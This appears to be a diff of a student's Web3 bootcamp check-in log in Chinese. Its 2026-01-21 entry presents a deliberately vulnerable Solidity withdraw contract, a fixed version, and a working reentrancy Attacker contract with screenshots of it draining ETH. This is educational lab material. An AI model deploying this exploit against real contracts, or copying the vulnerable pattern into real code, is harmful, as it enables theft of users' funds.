@@ -15,8 +15,139 @@ Web3 实习计划 2025 冬季实习生
 ## Notes
 
 <!-- Content_START -->
+# 2026-01-21
+<!-- DAILY_CHECKIN_2026-01-21_START -->
+## 今天首先完成了漏洞修复案例任务，完成了重入攻击漏洞修复，并编写了attack代码验证结果。
+
+### 有漏洞代码，先转账再更新状态：
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract VulnerableWithdraw {
+    mapping(address => uint256) public balance;
+
+    function deposit() external payable {
+        balance[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        require(balance[msg.sender] > 0, "No balance");
+
+        // ❌ 先转账，再更新状态（危险）
+        (bool sent, ) = msg.sender.call{value: balance[msg.sender]}("");
+        require(sent, "Transfer failed");
+
+        balance[msg.sender] = 0;
+    }
+}
+```
+
+### 无漏洞代码，先更新状态再转账：
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract SafeWithdraw {
+    mapping(address => uint256) public balance;
+
+    function deposit() external payable {
+        balance[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 amount = balance[msg.sender];
+        require(amount > 0, "No balance");
+
+        // ✅ 先更新状态
+        balance[msg.sender] = 0;
+
+        // ✅ 再进行外部调用
+        (bool sent, ) = msg.sender.call{value: amount}("");
+        require(sent, "Transfer failed");
+    }
+}
+```
+
+### attack代码：
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IVulnerableWithdraw {
+    function deposit() external payable;
+    function withdraw() external;
+}
+
+contract Attacker {
+    IVulnerableWithdraw public target;
+    address public owner;
+
+    constructor(address _target) {
+        target = IVulnerableWithdraw(_target);
+        owner = msg.sender;
+    }
+
+    // 发起攻击
+    function attack() external payable {
+        require(msg.value > 0, "Need ETH");
+
+        target.deposit{value: msg.value}();
+        target.withdraw();
+    }
+
+    // 重入点
+    receive() external payable {
+        if (address(target).balance > 0) {
+            target.withdraw();
+        }
+    }
+
+    // ✅ 使用 call 提现（推荐写法）
+    function withdrawETH() external {
+        require(msg.sender == owner, "Not owner");
+
+        (bool success, ) = owner.call{value: address(this).balance}("");
+        require(success, "ETH transfer failed");
+    }
+}
+```
+
+### 正常使用流程（看起来“没问题”）：
+
+### Step 1：用户存钱：用户调用deposit value: 1 ether，状态变化：balance：1 ether
+
+![QQ20260121-200322.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768998060262-QQ20260121-200322.png)![QQ20260121-200340.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768998370395-QQ20260121-200340.png)
+
+### step 2：用户提现： withdraw（）**执行结果：**通过，向地址转 1 ETH，balance = 0
+
+### attack运行过程：
+
+### step 1：输入目标地址，deploy
+
+![QQ20260121-200511.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768998726310-QQ20260121-200511.png)
+
+### step 2：执行攻击：attack value ：1 ether
+
+![QQ20260121-200547.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999047384-QQ20260121-200547.png)
+
+### 输出结果：attack地址下存在 2 ETH，而被攻击地址减少 2 ETH
+
+![QQ20260121-200633.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999624881-QQ20260121-200633.png)![QQ20260121-200558.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999413386-QQ20260121-200558.png)
+
+### 对于无漏洞代码，执行attack后会直接报错：
+
+![QQ20260121-200802.png](https://raw.githubusercontent.com/IntensiveCoLearning/Web3_Internship_Bootcamp_2026_Winter/main/assets/hwish39-byte/images/2026-01-21-1768999811283-QQ20260121-200802.png)
+
+## 随后听了jeff老师关于uniswap的分享会，大佬讲得太好了，有许多还没听懂，只能以后慢慢看回放了。
+<!-- DAILY_CHECKIN_2026-01-21_END -->
+
 # 2026-01-20
 <!-- DAILY_CHECKIN_2026-01-20_START -->
+
 ## 今天最重要的就是听了有关web3公共物品资金分配的分享会，受益良多，总结了一些内容。
 
 **在经济学中，公共物品具有两个核心特征：**
@@ -61,11 +192,13 @@ Web3 实习计划 2025 冬季实习生
 # 2026-01-19
 <!-- DAILY_CHECKIN_2026-01-19_START -->
 
+
 ## 今天主要**完成挑战 Challenge #0 - Tokenization和通过了 Ethernaut 前 3 关，对nft有了更深的理解**
 <!-- DAILY_CHECKIN_2026-01-19_END -->
 
 # 2026-01-18
 <!-- DAILY_CHECKIN_2026-01-18_START -->
+
 
 
 ## 今天主要听了分享会，从erc-721到erc-7962，总结了一些内容
@@ -118,11 +251,13 @@ Web3 实习计划 2025 冬季实习生
 
 
 
+
 # 今天虽然没看什么，但是还是坚持打卡
 <!-- DAILY_CHECKIN_2026-01-17_END -->
 
 # 2026-01-16
 <!-- DAILY_CHECKIN_2026-01-16_START -->
+
 
 
 
@@ -208,11 +343,13 @@ Solidity 采用“全有或全无”机制：
 
 
 
+
 ## 今天主要听了rick老师的智能体AI与web3融合的分享会。
 <!-- DAILY_CHECKIN_2026-01-15_END -->
 
 # 2026-01-14
 <!-- DAILY_CHECKIN_2026-01-14_START -->
+
 
 
 
@@ -264,6 +401,7 @@ Solidity 采用“全有或全无”机制：
 
 
 
+
 ## 今天主要阅读了021 学习以太坊第 2&3 章，了解了web3领域中合规与网络安全相关的内容。
 
 ## 以及铸造了第一个NFT
@@ -273,6 +411,7 @@ Solidity 采用“全有或全无”机制：
 
 # 2026-01-12
 <!-- DAILY_CHECKIN_2026-01-12_START -->
+
 
 
 
